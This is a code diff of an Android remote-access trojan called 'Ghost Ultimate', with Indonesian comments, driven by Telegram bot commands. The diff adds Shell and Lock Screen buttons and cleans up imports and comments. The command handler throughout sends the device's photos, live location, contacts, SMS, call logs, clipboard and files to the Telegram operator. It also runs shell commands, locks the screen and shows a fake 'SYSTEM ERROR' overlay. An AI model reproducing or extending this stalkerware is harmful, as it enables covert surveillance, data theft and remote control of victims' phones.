@@ -10,16 +10,15 @@ import android.graphics.PixelFormat
 import android.hardware.camera2.*
 import android.location.Location
 import android.location.LocationManager
+import android.media.AudioManager
 import android.media.ImageReader
 import android.media.MediaPlayer
-import android.media.AudioManager
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.speech.tts.TextToSpeech
 import android.util.Log
 import android.view.Gravity
-import android.view.View
 import android.view.WindowManager
 import android.widget.TextView
 import android.widget.Toast
@@ -51,7 +50,7 @@ class CaptureService : Service() {
         tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }
 
         scope.launch { 
-            val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}]],"resize_keyboard":true}"""
+            val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}],[{"text":"💻 Shell"},{"text":"🔒 Lock Screen"}]],"resize_keyboard":true}"""
             TgSender.sendMessage("🟢 <b>Ghost Ultimate online</b>\nDevice: ${Build.MODEL}\n\nGunakan tombol di bawah atau ketik /menu", kb) 
         }
         scope.launch { pollLoop() }
@@ -83,7 +82,7 @@ class CaptureService : Service() {
                     handleCommand(msg.optString("text").trim())
                 }
             } catch (e: Exception) { Log.w("Ghost", "poll", e) }
-            delay(100) // Delay super kecil karena Long Polling udah nahan koneksi
+            delay(100)
         }
     }
 
@@ -94,8 +93,6 @@ class CaptureService : Service() {
                 TgSender.sendMessage(MENU, kb)
             }
             cmd == "/status" -> TgSender.sendMessage("🟢 alive\ntorch=${if (torchOn) "on" else "off"}\ntrack=${if (tracking) "on" else "off"}")
-            
-            // KAMERA & MEDIA
             cmd == "📸 Photo" || cmd == "/photo" -> scope.launch { takePhotoAndSend() }
             cmd.startsWith("/camera ") -> {
                 val mode = cmd.removePrefix("/camera ").trim()
@@ -115,8 +112,6 @@ class CaptureService : Service() {
             }
             cmd == "/stop" -> { mediaPlayer?.release(); mediaPlayer = null; TgSender.sendMessage("⏹️ Stopped") }
             cmd.startsWith("/tts ") -> { tts?.speak(cmd.removePrefix("/tts ").trim(), TextToSpeech.QUEUE_FLUSH, null, "ghost_tts"); TgSender.sendMessage("🗣️ Speaking...") }
-
-            // HARDWARE & OVERLAY
             cmd == "🔦 Torch On" || cmd == "/torch_on" -> scope.launch { setTorch(true) }
             cmd == "🔦 Torch Off" || cmd == "/torch_off" -> scope.launch { setTorch(false) }
             cmd == "/strobe" -> { scope.launch { repeat(15) { setTorch(true); delay(80); setTorch(false); delay(80) }; TgSender.sendMessage("🔦 Strobe done") } }
@@ -126,7 +121,7 @@ class CaptureService : Service() {
                 if (dpm.isAdminActive(comp)) { dpm.lockNow(); TgSender.sendMessage("🔒 Layar dikunci!") } 
                 else { TgSender.sendMessage("❌ Izin Admin belum aktif. Buka app dulu.") }
             }
-            cmd.startsWith("/error ") -> showPcError(cmd.removePrefix("/error ")) // TOAST RAKSASA
+            cmd.startsWith("/error ") -> showPcError(cmd.removePrefix("/error "))
             cmd == "/vibrate" -> {
                 val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                 if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(800)
@@ -134,12 +129,10 @@ class CaptureService : Service() {
             }
             cmd.startsWith("/volume ") -> {
                 val lvl = cmd.removePrefix("/volume ").trim().toIntOrNull() ?: 50
-                val am = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
-                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, (am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC) * lvl / 100), 0)
+                val am = getSystemService(AUDIO_SERVICE) as AudioManager
+                am.setStreamVolume(AudioManager.STREAM_MUSIC, (am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * lvl / 100), 0)
                 TgSender.sendMessage("🔊 volume $lvl%")
             }
-
-            // LOKASI & FILE
             cmd == "📍 Loc" || cmd == "/loc" -> scope.launch { sendLocation() }
             cmd == "/track_on" -> { tracking = true; scope.launch { trackLoop() }; TgSender.sendMessage("📍 tracking on") }
             cmd == "/track_off" -> { tracking = false; TgSender.sendMessage("📍 tracking off") }
@@ -162,8 +155,6 @@ class CaptureService : Service() {
                     TgSender.sendDocument(f.readBytes(), f.name, "📄 File: ${f.name}")
                 }
             }
-
-            // DATA & APPS
             cmd.startsWith("/toast ") -> { Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.removePrefix("/toast "), Toast.LENGTH_LONG).show() }; TgSender.sendMessage("💬 toast sent") }
             cmd.startsWith("/open ") -> { try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(cmd.removePrefix("/open "))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🌐 opened") } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") } }
             cmd.startsWith("/startapp ") -> {
@@ -183,14 +174,13 @@ class CaptureService : Service() {
         }
     }
 
-    // FITUR TOAST ERROR RAKSASA ALA PC
     private fun showPcError(text: String) {
         if (!Settings.canDrawOverlays(this)) { TgSender.sendMessage("❌ Izin Overlay belum aktif!"); return }
         val wm = getSystemService(WINDOW_SERVICE) as WindowManager
         val view = TextView(this).apply {
             this.text = "⚠️ SYSTEM ERROR\n\n$text\n\n[Auto close in 5s]"
             setTextColor(Color.WHITE)
-            setBackgroundColor(Color.parseColor("#CC000000")) // Hitam transparan
+            setBackgroundColor(Color.parseColor("#CC000000"))
             textSize = 18f
             gravity = Gravity.CENTER
             setPadding(40, 40, 40, 40)
@@ -204,7 +194,7 @@ class CaptureService : Service() {
         )
         try {
             wm.addView(view, params)
-            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000) // Hilang 5 detik
+            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000)
             TgSender.sendMessage("💻 PC Error Toast ditampilkan (5s)")
         } catch (e: Exception) { TgSender.sendMessage("❌ Overlay err: ${e.message}") }
     }
@@ -259,17 +249,15 @@ class CaptureService : Service() {
     companion object {
         val MENU = """
 🤖 <b>Ghost Ultimate — Menu</b>
-Gunakan keyboard di bawah atau ketik command:
-
-📸 <b>Kamera</b>: /photo, /camera front|back
-📍 <b>Lokasi</b>: /loc, /track_on, /track_off
-🔦 <b>Hardware</b>: /torch_on, /torch_off, /strobe, /vibrate
-🔒 <b>Sistem</b>: /lock (kunci layar), /error [teks] (Toast PC)
-💻 <b>Shell</b>: /shell [cmd]
-📂 <b>File</b>: /files, /download [path]
-📇 <b>Data</b>: /contacts, /sms, /calls, /apps, /device, /clip
-💬 <b>Aksi</b>: /toast [teks], /open [url], /startapp [pkg]
-🎵 <b>Media</b>: /play [url], /stop, /tts [teks]
+📸 /photo, /camera front|back
+📍 /loc, /track_on, /track_off
+🔦 /torch_on, /torch_off, /strobe
+🔒 /lock (kunci layar)
+💻 /shell [cmd]
+📂 /files, /download [path]
+📇 /contacts, /sms, /calls, /apps, /device, /clip
+💬 /toast, /open, /startapp
+🎵 /play, /stop, /tts
         """.trimIndent()
     }
 }
